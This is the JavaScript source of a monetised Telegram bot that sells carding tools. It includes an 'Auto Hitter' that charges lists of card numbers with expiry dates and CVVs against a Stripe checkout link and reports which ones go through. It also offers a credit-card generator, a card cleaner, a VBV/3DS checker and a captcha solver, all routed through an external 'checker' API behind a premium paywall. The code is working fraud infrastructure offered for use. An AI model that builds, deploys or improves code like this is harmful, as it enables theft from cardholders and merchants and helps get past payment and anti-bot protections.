require('dotenv').config();
const { Telegraf } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const { Cashfree, CFEnvironment } = require('cashfree-pg');   // Fixed import
const express = require('express');

// Dummy HTTP server for platforms like Render/Koyeb to pass health checks
const app = express();
const port = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('DAMXd89 ULTIMATE BOT is awake!'));
app.listen(port, () => console.log(`Dummy web server listening on port ${port}`));

const BOT_TOKEN = process.env.BOT_TOKEN;
const ENDER_KEY = process.env.ENDER_KEY;

const CASHFREE_CLIENT_ID = process.env.CASHFREE_CLIENT_ID;
const CASHFREE_CLIENT_SECRET = process.env.CASHFREE_CLIENT_SECRET;
const CASHFREE_ENV = process.env.CASHFREE_ENV || 'PRODUCTION';

const NOWPAYMENTS_API_KEY = process.env.NOWPAYMENTS_API_KEY;

const ADMIN_USER_ID = parseInt(process.env.ADMIN_USER_ID);

const BASE_URL = 'https://api.ender.black/v1';
const bot = new Telegraf(BOT_TOKEN);
const notifyBot = new Telegraf(process.env.NOTIFY_BOT_TOKEN);

// Fixed Cashfree v5.x Setup
const cashfree = new Cashfree(
    CASHFREE_ENV === 'PRODUCTION' ? CFEnvironment.PRODUCTION : CFEnvironment.SANDBOX,
    CASHFREE_CLIENT_ID,
    CASHFREE_CLIENT_SECRET
);

const headers = {
    Authorization: ENDER_KEY,
    'Content-Type': 'application/json'
};

const DB_FILE = './database.json';
const DEFAULT_CREDITS = 50;

// Initialize Database
let db = { users: {} };
if (fs.existsSync(DB_FILE)) {
    db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function saveDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

function getUser(userId) {
    if (!db.users[userId]) {
        db.users[userId] = {
            credits: DEFAULT_CREDITS,
            premium: false
        };
        saveDB();
    }
    return db.users[userId];
}

function deductCredit(userId, amount = 1) {
    const user = getUser(userId);
    if (user.premium) return true; // Premium is unlimited
    if (user.credits < amount) return false;
    user.credits -= amount;
    saveDB();
    
    // Low credits warning
    if (user.credits === 5) {
        bot.telegram.sendMessage(userId, '⚠️ <b>Low Credits Warning!</b>\nYou only have 5 credits left. Upgrade to Premium for unmetered access!\n\n👉 Type /pay to upgrade.', { parse_mode: 'HTML' }).catch(()=>null);
    }
    
    return true;
}

function isPremium(userId) {
    if (userId === ADMIN_USER_ID) return true;
    const user = getUser(userId);
    return user.premium;
}

// Helper
async function callEnder(endpoint, payload = {}, method = 'POST') {
    try {
        const url = `${BASE_URL}${endpoint}`;
        const res = method === 'GET'
            ? await axios.get(url, { headers })
            : await axios.post(url, payload, { headers });
        return res.data;
    } catch (e) {
        const errorMsg = e.response && e.response.data ? e.response.data.error || JSON.stringify(e.response.data) : e.message;
        return { success: false, error: errorMsg };
    }
}


const checkPremium = (next) => async (ctx) => {
    if (isPremium(ctx.from.id)) return next(ctx);
    await ctx.reply('🔒 Premium only! Type /pay to unlock unlimited access.');
};

const checkCredits = (next) => async (ctx) => {
    const user = getUser(ctx.from.id);
    if (user.premium || user.credits > 0) return next(ctx);
    await ctx.reply('⚠️ No credits! Type /pay or contact admin to top up.');
};

const userStates = {};
const hitterLinks = {};

function clearState(userId) {
    if (userStates[userId]) delete userStates[userId];
    if (hitterLinks[userId]) delete hitterLinks[userId];
}

// ==================== GLOBAL USER TRACKING MIDDLEWARE ====================
bot.use(async (ctx, next) => {
    if (ctx.from) {
        const userId = ctx.from.id;
        const isNewUser = !db.users[userId];
        
        const dbUser = getUser(userId); // Ensure user is added to DB
        
        // Keep their username up-to-date in the DB
        let updated = false;
        if (ctx.from.username && dbUser.username !== ctx.from.username) {
            dbUser.username = ctx.from.username;
            updated = true;
        }
        if (ctx.from.first_name && dbUser.first_name !== ctx.from.first_name) {
            dbUser.first_name = ctx.from.first_name;
            updated = true;
        }
        if (updated) saveDB();

        if (isNewUser) {
            try {
                const fName = ctx.from.first_name ? ctx.from.first_name.replace(/</g, '&lt;').replace(/>/g, '&gt;') : 'Unknown';
                const uname = ctx.from.username ? `(@${ctx.from.username})` : '';
                const totalUsers = Object.keys(db.users).length;
                const msg = `🔔 <b>New User Joined!</b>\n\n👤 Name: ${fName} ${uname}\n🆔 ID: <code>${userId}</code>\n\n📊 Total Users: ${totalUsers}`;
                
                await notifyBot.telegram.sendMessage(ADMIN_USER_ID, msg, { parse_mode: 'HTML' });
            } catch (e) {
                console.error('Failed to send join notification to admin', e);
            }
        }
    }
    return next();
});

// ==================== NOTIFICATION BOT COMMANDS ====================
notifyBot.command('start', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return;
    await ctx.reply("👋 Welcome Admin! I am the notification bot.\n\nUse /stats to check user statistics.\nUse /users to see the list of user usernames.");
});

notifyBot.command('stats', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    const totalUsers = Object.keys(db.users).length;
    let premiumCount = 0;
    for (const uid in db.users) {
        if (db.users[uid].premium) premiumCount++;
    }
    await ctx.reply(`📊 **Bot Statistics**\n\n👥 Total Users: ${totalUsers}\n💎 Premium Users: ${premiumCount}`);
});

notifyBot.command('users', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    
    let msg = `👥 <b>All Bot Users:</b>\n\n`;
    const users = Object.entries(db.users);
    
    if (users.length === 0) {
        return ctx.reply("No users yet!");
    }

    const statusMsg = await ctx.reply("🔄 Fetching missing user profiles from Telegram... please wait.");

    // Split into chunks if too long (TG limit is 4096 chars)
    for (let i = 0; i < users.length; i++) {
        const [uid, udata] = users[i];
        
        // Dynamically fetch from Telegram API if name is missing
        if (!udata.first_name || udata.first_name === 'Unknown') {
            try {
                // Fetch using the primary bot instance
                const chat = await bot.telegram.getChat(uid);
                if (chat) {
                    udata.first_name = chat.first_name;
                    if (chat.username) udata.username = chat.username;
                    saveDB(); // Save the retrieved data permanently
                }
            } catch (e) {
                // Ignore errors (user blocked bot, account deleted, etc)
            }
        }

        const fName = udata.first_name ? udata.first_name.replace(/</g, '&lt;').replace(/>/g, '&gt;') : 'Unknown';
        const uname = udata.username ? ` (@${udata.username})` : '';
        const plan = udata.premium ? '💎' : '🆓';
        const line = `• <code>${uid}</code> | ${fName}${uname} | ${plan}\n`;
        
        if (msg.length + line.length > 4000) {
            await ctx.reply(msg, { parse_mode: 'HTML' });
            msg = line;
        } else {
            msg += line;
        }
    }
    
    if (msg.trim().length > 0) {
        await ctx.reply(msg, { parse_mode: 'HTML' });
    }
    
    try { await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id); } catch(e) {}
});

// ==================== ADMIN COMMANDS (MAIN BOT) ====================
bot.command('broadcast_promo', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    
    const msg = ctx.message.text.split(' ').slice(1).join(' ');
    if (!msg) return ctx.reply('Usage: /broadcast_promo <message>');
    
    await ctx.reply(`🚀 Broadcasting to all Free users...`);
    
    let success = 0;
    const targets = Object.keys(db.users).filter(uid => !db.users[uid].premium);
    
    for (const uid of targets) {
        try {
            await bot.telegram.sendMessage(uid, `📢 <b>Message from Admin:</b>\n\n${msg}\n\n💎 <i>Type /pay to upgrade to Premium!</i>`, { parse_mode: 'HTML' });
            success++;
        } catch (e) {}
        await new Promise(r => setTimeout(r, 100)); // Rate limit buffer
    }
    
    await ctx.reply(`✅ Broadcast complete! Delivered to ${success}/${targets.length} users.`);
});

bot.command('admin_activate', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    const userId = parseInt(ctx.message.text.split(' ')[1]);
    if (!userId) return ctx.reply('Usage: /admin_activate <user_id>');
    const user = getUser(userId);
    user.premium = true;
    saveDB();
    await ctx.reply(`✅ Premium ACTIVATED for user ${userId}`);
});

bot.command('admin_deactivate', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    const userId = parseInt(ctx.message.text.split(' ')[1]);
    if (!userId) return ctx.reply('Usage: /admin_deactivate <user_id>');
    const user = getUser(userId);
    user.premium = false;
    saveDB();
    await ctx.reply(`✅ Premium DEACTIVATED for user ${userId}`);
});

bot.command('admin_add', async (ctx) => {
    if (ctx.from.id !== ADMIN_USER_ID) return ctx.reply('❌ Admin only!');
    const parts = ctx.message.text.split(' ');
    const userId = parseInt(parts[1]);
    const amount = parseInt(parts[2]);
    if (!userId || isNaN(amount)) return ctx.reply('Usage: /admin_add <user_id> <amount>');
    const user = getUser(userId);
    user.credits += amount;
    saveDB();
    await ctx.reply(`✅ Added ${amount} credits to user ${userId}. New balance: ${user.credits}`);
});

bot.command('id', async (ctx) => {
    await ctx.reply(`Your Telegram ID: ${ctx.from.id}`);
});

// ==================== PAYMENT SYSTEM ====================
bot.command('pay', async (ctx) => {
    const keyboard = [
        [{ text: '💸 Cashfree (UPI/Card)', callback_data: 'pay_cashfree' }],
        [{ text: '₿ Crypto (BTC/ETH/USDT/SOL)', callback_data: 'pay_crypto' }],
        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
    ];
    await ctx.reply('💎 **Unlock Premium Access**\nUnlimited hitter, solvers & more\nPrice: ₹499 / $6\nChoose method:',
        { reply_markup: { inline_keyboard: keyboard } });
});

bot.action('pay_cashfree', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    const orderId = `cf_${Date.now()}_${ctx.from.id}`;
    const amount = 499;

    const request = {
        order_amount: amount,
        order_currency: "INR",
        order_id: orderId,
        customer_details: {
            customer_id: `user_${ctx.from.id}`,
            customer_name: ctx.from.first_name || "User",
            customer_email: "user@example.com",
            customer_phone: "9999999999"
        }
    };
    try {
        const baseUrl = CASHFREE_ENV === 'PRODUCTION' ? 'https://api.cashfree.com' : 'https://sandbox.cashfree.com';
        const response = await axios.post(`${baseUrl}/pg/orders`, request, {
            headers: {
                'x-client-id': CASHFREE_CLIENT_ID,
                'x-client-secret': CASHFREE_CLIENT_SECRET,
                'x-api-version': '2022-01-01',
                'Content-Type': 'application/json'
            }
        });

        const paymentUrl = response.data ? response.data.payment_link : null;

        if (!paymentUrl) throw new Error("Could not generate valid checkout link from API");

        const keyboard = [[{ text: '✅ I have paid', callback_data: `check_cashfree_${orderId}` }]];
        await ctx.editMessageText(`✅ Cashfree Order Created (₹${amount})\n\nPay securely here:\n${paymentUrl}`,
            { reply_markup: { inline_keyboard: keyboard } });
    } catch (e) {
        const errMsg = e.response && e.response.data ? (e.response.data.message || JSON.stringify(e.response.data)) : e.message;
        await ctx.reply('❌ Cashfree error: ' + errMsg);
    }
});


bot.action('pay_crypto', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) {}
    
    const keyboard = [
        [{ text: 'Bitcoin (BTC)', callback_data: 'pay_coin_btc' }, { text: 'Litecoin (LTC)', callback_data: 'pay_coin_ltc' }],
        [{ text: 'Tron (TRX)', callback_data: 'pay_coin_trx' }],
        [{ text: '🔙 Back', callback_data: 'main_menu' }]
    ];
    await ctx.editMessageText('💎 **Select Cryptocurrency ($6 / ₹499)**\nChoose your preferred coin:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
    });
});

bot.action(/^pay_coin_(.+)$/, async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) {}
    const coin = ctx.match[1];
    
    const payload = {
        price_amount: 6,
        price_currency: "usd",
        pay_currency: coin,
        order_id: `crypto_${Date.now()}`,
        order_description: "Premium Access - DAMXd89 ULTIMATE BOT v5.3"
    };

    try {
        const res = await axios.post('https://api.nowpayments.io/v1/payment', payload, {
            headers: { 'x-api-key': NOWPAYMENTS_API_KEY }
        });
        const payment = res.data;
        const keyboard = [[{ text: '✅ I have paid', callback_data: `check_crypto_${payment.payment_id}` }]];
        
        await ctx.editMessageText(
            `💎 **Send Exactly:** \`${payment.pay_amount}\` **${payment.pay_currency.toUpperCase()}**\n\n` +
            `**To Address:**\n\`${payment.pay_address}\`\n\n` +
            `⚠️ Send the exact amount otherwise it will not activate!\n` +
            `Click ✅ after sending.`,
            { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }
        );
    } catch (e) {
        const errMsg = e.response && e.response.data ? JSON.stringify(e.response.data) : e.message;
        await ctx.reply('❌ Crypto error: ' + errMsg);
    }
});


// ==================== PAYMENT VERIFICATION ====================
bot.action(/^check_cashfree_(.+)$/, async (ctx) => {
    const orderId = ctx.match[1];
    try {
        const response = await cashfree.PGFetchOrder(orderId);
        if (response.data && response.data.order_status === "PAID") {
            const user = getUser(ctx.from.id);
            user.premium = true;
            saveDB();
            await ctx.reply("💎 **Premium Activated!** ✅ Payment Done! Thank you for your support.");
            await ctx.deleteMessage();
        } else {
            await ctx.answerCbQuery("❌ Sorry, payment not done, try again. If you just paid, wait 1 minute.", { show_alert: true });
        }
    } catch (e) {
        await ctx.reply("❌ Error checking payment: " + e.message);
    }
});

bot.action(/^check_crypto_(.+)$/, async (ctx) => {
    const paymentId = ctx.match[1];
    try {
        const res = await axios.get(`https://api.nowpayments.io/v1/payment/${paymentId}`, {
            headers: { 'x-api-key': NOWPAYMENTS_API_KEY }
        });
        if (res.data.payment_status === "finished" || res.data.payment_status === "confirmed") {
            const user = getUser(ctx.from.id);
            user.premium = true;
            saveDB();
            await ctx.reply("💎 **Premium Activated!** ✅ Payment Done! Thank you for your support.");
            await ctx.deleteMessage();
        } else {
            await ctx.answerCbQuery(`❌ Current Status: ${res.data.payment_status}. Please wait for confirmation.`, { show_alert: true });
        }
    } catch (e) {
        await ctx.reply("❌ Error checking payment: " + e.message);
    }
});

// ==================== MAIN MENU ====================
async function showMainMenu(ctx) {
    clearState(ctx.from.id);
    const keyboard = [
        [{ text: '💰 Balance', callback_data: 'balance' }, { text: '🚪 Gates', callback_data: 'gates' }],
        [{ text: '🔍 BIN Lookup', callback_data: 'bin' }, { text: '💳 CC Generator', callback_data: 'ccgen' }],
        [{ text: '🧹 CC Cleaner', callback_data: 'cleaner' }, { text: '🔥 Auto Hitter', callback_data: 'hitter' }],
        [{ text: '🛡️ Captcha', callback_data: 'captcha' }, { text: '🔐 VBV/3DS', callback_data: 'vbv' }]
    ];
    await ctx.reply('🔥 **DAMXd89 ULTIMATE BOT v5.3**\nType /pay for premium',
        { reply_markup: { inline_keyboard: keyboard } });
}

bot.start(showMainMenu);
bot.action('main_menu', async (ctx) => { await ctx.answerCbQuery(); await showMainMenu(ctx); });

// ==================== FEATURE HANDLERS ====================
bot.action('balance', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    const user = getUser(ctx.from.id);
    await ctx.reply(`💰 **Your Balance**\n\nCredits: ${user.credits}\nPlan: ${user.premium ? 'PREMIUM' : 'FREE'}\n\n*API and Key details are now hidden.*`, { parse_mode: 'Markdown' });
});

bot.action('gates', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    const res = await callEnder('/checkers', {}, 'GET');
    if (res.success) {
        let msg = "🚪 **Available Gates**\n\n";
        (res.data.routes || []).forEach(r => {
            msg += `• ${r}\n`;
        });
        await ctx.reply(msg || "No gates available at the moment.");
    } else {
        await ctx.reply(`❌ Gates Error: ${res.error || 'Unknown error'}`);
    }
});

bot.action('bin', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    await ctx.reply("🔍 **BIN Lookup**\nSend a 6-digit BIN to get details (e.g. 411111)");
});

bot.action('ccgen', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    await ctx.reply("💳 **CC Generator**\nUsage: /ccgen <bin>\nExample: /ccgen 411111");
});

bot.action('cleaner', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    userStates[ctx.from.id] = 'WAITING_CLEANER';
    await ctx.reply("🧹 **CC Cleaner**\nSend your card list now (format: number|month|year|cvv).");
});

bot.action('hitter', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch (e) { }
    userStates[ctx.from.id] = 'WAITING_HITTER_LINK';
    await ctx.reply("🔥 **Auto Hitter Ready**\n\nStep 1: Send the **Stripe Checkout Link** now.");
});

bot.action('captcha', async (ctx) => {
    await ctx.answerCbQuery();
    userStates[ctx.from.id] = 'WAITING_CAPTCHA';
    await ctx.reply("🛡️ **Captcha Solver**\nSend the captcha payload (sitekey|url|type).");
});

bot.action('vbv', async (ctx) => {
    await ctx.answerCbQuery();
    userStates[ctx.from.id] = 'WAITING_VBV';
    await ctx.reply("🔐 **VBV/3DS Checker**\nSend card details (format: number|month|year|cvv).");
});

// ==================== TEXT HANDLERS ====================
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text.trim();
    const state = userStates[userId];

    if (state) {
        if (state === 'WAITING_HITTER_LINK') {
            hitterLinks[userId] = text;
            userStates[userId] = 'WAITING_HITTER_CARDS';
            await ctx.reply("✅ Link received! Now send your **Cards List** (format: number|month|year|cvv).\n\n💰 Cost: 5 credits.");
            return;
        }

        let cost = 2;
        if (state === 'WAITING_HITTER_CARDS') cost = 5;

        if (!deductCredit(userId, cost)) return ctx.reply(`⚠️ You need ${cost} credits for this feature! Type /pay to top up.`);
        let endpoint = '';
        let payload = {};

        const cardsArray = text.split('\n').map(c => c.trim()).filter(c => c.length > 0);

        if (state === 'WAITING_HITTER_CARDS') {
            const stripeLink = hitterLinks[userId];
            if (!deductCredit(userId, 5)) return ctx.reply("⚠️ You need 5 credits for this feature! Type /pay to top up.");

            let statusMsg = await ctx.reply(`🚀 **Initializing Auto Hitter...** [0/${cardsArray.length}]`);
            let lives = [];
            let deads = [];

            for (let i = 0; i < cardsArray.length; i++) {
                const card = cardsArray[i];
                try {
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
                        `🔍 **Checking Card**: \`${card.substring(0, 6)}... \` [${i + 1}/${cardsArray.length}]\n🟢 LIVE: ${lives.length} | 🔴 DEAD: ${deads.length}`,
                        { parse_mode: 'Markdown' }
                    );
                } catch (e) { }

                const res = await callEnder('/checkers/charge', {
                    gate: 'stripe-charge-01',
                    gateId: 'stripe-charge-01',
                    id: 'stripe-charge-01',
                    link: stripeLink,
                    url: stripeLink,
                    cc: card,
                    cards: [card]
                }, 'POST');

                if (res.success && (res.data.live || res.data.charged || (res.data.status && res.data.status.includes('succeeded')))) {
                    lives.push(`${card} - ✅ Payment Done!`);
                } else {
                    deads.push(`${card} - ❌ Sorry, payment not done, try again`);
                }

                await new Promise(r => setTimeout(r, 800));
            }

            let finalReport = `🔥 **Auto Hitter Report**\n\n`;
            finalReport += `🟢 **LIVE**: ${lives.length}\n`;
            finalReport += `🔴 **DEAD**: ${deads.length}\n\n`;

            if (lives.length > 0) {
                finalReport += `**Lives:**\n<code>${lives.join('\n')}</code>\n\n`;
            }
            finalReport += `💳 Credits remaining: ${getUser(userId).credits}`;
            if (!getUser(userId).premium) finalReport += `\n\n💎 <b>Upgrade to Premium for unlimited uses!</b> Type /pay`;

            await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, finalReport, { parse_mode: 'HTML' });
            clearState(userId);
            return;
        }

        if (state === 'WAITING_CLEANER') {
            endpoint = '/tools/cc-cleaner';
            payload = { input: text };
        } else if (state === 'WAITING_VBV') {
            endpoint = '/checkers/vbv';
            payload = { gate: 'vbv', cards: cardsArray };
        } else if (state === 'WAITING_CAPTCHA') {
            endpoint = '/solvers/solve';
            const [sitekey, url, type] = text.split('|');
            payload = { sitekey, url, type };
        }

        const res = await callEnder(endpoint, payload, 'POST');
        clearState(userId);

        if (res.success) {
            let replyText = `✅ **Request Successful**\n\n<pre>${JSON.stringify(res.data, null, 2)}</pre>\n\n💳 Credits remaining: ${getUser(userId).credits}`;
            if (!getUser(userId).premium) replyText += `\n\n💎 <b>Upgrade to Premium for unlimited uses!</b> Type /pay`;
            await ctx.reply(replyText, { parse_mode: 'HTML' });
        } else {
            const errorMsg = res.error || (res.data && res.data.error) || 'Request failed';
            if (errorMsg.includes('subscription')) {
                await ctx.reply(`🔒 **Subscription Required**\nThis feature requires a PREMIUM API key. Your current key is on the FREE plan.`);
            } else if (errorMsg.includes('maintenance')) {
                await ctx.reply(`🔧 **Under Maintenance**\nThe API provider has temporarily disabled this tool for maintenance.`);
            } else {
                await ctx.reply(`❌ Feature Error: ${errorMsg}`);
            }
        }
        return;
    }

    // Auto BIN Lookup (matches 6-8 digit numbers)
    if (/^\d{6,8}$/.test(text)) {
        const user = getUser(ctx.from.id);
        if (!user.premium && user.credits < 1) return ctx.reply("⚠️ No credits! Type /pay to top up.");

        await ctx.reply(`🔍 Looking up BIN: ${text}...`);
        const res = await callEnder('/tools/bin-lookup', { bins: [text] }, 'POST');
        if (res.success && res.data.bins && res.data.bins[0]) {
            deductCredit(ctx.from.id, 1);
            const data = res.data.bins[0];
            const msg = `✅ **BIN INFO**\n\n` +
                `💳 BIN: ${text}\n` +
                `🏦 Bank: ${data.issuer || 'Unknown'}\n` +
                `🌍 Country: ${data.country_name || 'Unknown'}\n` +
                `🏴 Flag: ${data.country_emoji || ''}\n` +
                `🔹 Type: ${data.type || 'Unknown'}\n` +
                `🔸 Brand: ${data.brand || 'Unknown'}\n\n` +
                `💳 Remaining Credits: ${getUser(ctx.from.id).credits}`;
            let finalMsg = msg;
            if (!user.premium) finalMsg += `\n\n💎 <b>Upgrade to Premium for unlimited uses!</b> Type /pay`;
            await ctx.reply(finalMsg);
        } else {
            await ctx.reply(`❌ BIN Error: ${res.error || 'Not found'}`);
        }
        return;
    }

    // CC Generator Command
    if (text.startsWith('/ccgen')) {
        const bin = text.split(' ')[1];
        if (!bin || !/^\d{6}$/.test(bin)) return ctx.reply("Usage: /ccgen <6-digit bin>");

        const user = getUser(ctx.from.id);
        if (!user.premium && user.credits < 1) return ctx.reply("⚠️ No credits! Type /pay to top up.");

        await ctx.reply(`💳 Generating cards for BIN ${bin}...`);
        const res = await callEnder('/tools/cc-generator', { bins: [bin] }, 'POST');
        if (res.success && res.data.cards) {
            deductCredit(ctx.from.id, 1);
            let genMsg = `✅ **Generated Cards**\n\n<code>${(res.data.cards || []).join('\n')}</code>\n\n💳 Remaining Credits: ${getUser(ctx.from.id).credits}`;
            if (!user.premium) genMsg += `\n\n💎 <b>Upgrade to Premium for unlimited uses!</b> Type /pay`;
            await ctx.reply(genMsg, { parse_mode: 'HTML' });
        } else {
            await ctx.reply(`❌ Gen Error: ${res.error || 'Failed to generate'}`);
        }
        return;
    }
});

bot.launch().catch(err => {
    console.error('❌ FAILED TO LAUNCH BOT:', err.message);
});

notifyBot.launch().catch(err => {
    console.error('❌ FAILED TO LAUNCH NOTIFY BOT:', err.message);
});

// Stability Fix: Prevent global crashes
process.on('uncaughtException', (err) => {
    console.error('❌ UNCAUGHT EXCEPTION:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ UNHANDLED REJECTION AT:', promise, 'REASON:', reason);
});

// ==================== SCHEDULED TASKS ====================
// Send promo to free users every 24 hours
setInterval(async () => {
    const targets = Object.keys(db.users).filter(uid => !db.users[uid].premium);
    for (const uid of targets) {
        try {
            await bot.telegram.sendMessage(uid, '🎁 <b>Love using the bot?</b>\n\nUnlock its full potential by upgrading to Premium! You will get unlimited access to Auto Hitter, Checkers, and more.\n\n👉 Type /pay to upgrade now!', { parse_mode: 'HTML' });
        } catch (e) {}
        await new Promise(r => setTimeout(r, 150)); // Rate limit buffer
    }
}, 24 * 60 * 60 * 1000);

console.log('🚀 DAMXd89 ULTIMATE BOT v5.3 FIXED AND RUNNING SUCCESSFULLY!');